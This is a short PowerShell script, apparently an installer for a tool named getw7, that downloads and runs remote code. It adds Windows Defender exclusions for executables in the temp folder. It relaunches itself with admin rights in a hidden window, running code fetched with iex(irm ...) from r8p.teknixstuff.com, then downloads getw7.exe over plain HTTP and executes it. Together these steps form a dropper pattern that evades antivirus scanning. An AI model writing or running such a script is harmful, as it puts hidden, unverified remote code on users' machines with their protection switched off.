Add-MpPreference -ExclusionPath "$env:temp\getw7.exe"
Add-MpPreference -ExclusionPath "$env:temp\w7.exe"
If (!(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-nop','-c iex(irm r8p.teknixstuff.com)'; Exit;
}
Invoke-WebRequest -Uri 'http://r8p.teknixstuff.com/files/getw7.exe' -OutFile "$env:temp\getw7.exe"
Start-Process "$env:temp\getw7.exe"
